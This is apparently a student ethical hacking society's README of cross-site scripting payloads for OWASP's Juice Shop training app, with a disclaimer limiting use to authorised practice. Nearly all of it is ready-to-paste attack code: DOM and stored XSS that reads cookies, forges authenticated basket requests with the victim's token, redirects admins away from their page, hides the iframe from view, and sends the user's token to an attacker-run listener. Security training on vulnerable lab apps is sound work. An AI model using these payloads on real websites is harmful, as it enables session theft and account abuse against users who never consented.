# Disclaimer

All scripts developed for educational purposes during sessions with Sheffield Ethical Student Hackers Society, and executed on OWASP's dedicated Juice Shop training platform. Do not execute these scripts unless you have explicit permission. SESH Code of Conduct can be found [here](https://shefesh.com/downloads/SESH%20Code%20of%20Conduct.pdf).

# DOM XSS

To be injected via the search bar. Renders immediately after executing search.

## Printing Cookies to Screen

`<iframe src="javascript:alert(document.cookie)">`

## Redirect to SESH Website

`<iframe src="javascript:window.top.location.href = 'http://www.shefesh.com';">`

## Add an item to Basket

`<iframe src="javascript:var http = new XMLHttpRequest(); var url = '/api/BasketItems'; http.open('POST', url); var cookie = document.cookie; var token = cookie.substring(cookie.indexOf('token=') + 6); http.setRequestHeader('Content-Type', 'application/json'); http.setRequestHeader('Authorization', 'Bearer ' + token); http.send(JSON.stringify({'ProductId':2, 'BasketId':'1', 'quantity':1}));">`

# Persistent XSS

To be injected via the customer feedback form. Renders on both 'About Us' and 'Administration' pages.

## Printing Cookies to Screen

`<<script>Foo</script>iframe src="javascript:alert(document.cookie)">`

## Redirect to Homepage

Especially irritating script - prevents admins from viewing the Administration page.

`<<script>Foo</script>iframe src="javascript:window.top.location.href = ‘/#/’;">`

## Add an item to Basket

`<<script>Foo</script>iframe src="javascript:var http = new XMLHttpRequest(); var url = '/api/BasketItems'; http.open('POST', url); var cookie = document.cookie; var token = cookie.substring(cookie.indexOf('token=') + 6); http.setRequestHeader('Content-Type', 'application/json'); http.setRequestHeader('Authorization', 'Bearer ' + token); http.send(JSON.stringify({'ProductId':2, 'BasketId':'1', 'quantity':1}));">`

## Steal the Current User's Token

Best applied via persistent XSS, although can be used as DOM. Must have a server running - see [my script](https://github.com/Twigonometry/CTF-Tools/blob/master/scripts/simple-python-server.py).

`<<script>Foo</script>iframe src="javascript:var http = new XMLHttpRequest(); var url = 'http://localhost:8000'; http.open('POST', url); var cookie = document.cookie; var token = cookie.substring(cookie.indexOf('token=') + 6); http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); http.send(JSON.stringify({'StolenToken':token}));">`

# Sneaky Payload

Makes use of CSS style options to conceal the iframe. Can be applied to any of above payloads.

`<iframe style=“width: 1px; height: 1px; display: none;” src=“javascript:alert(‘xss’);”>`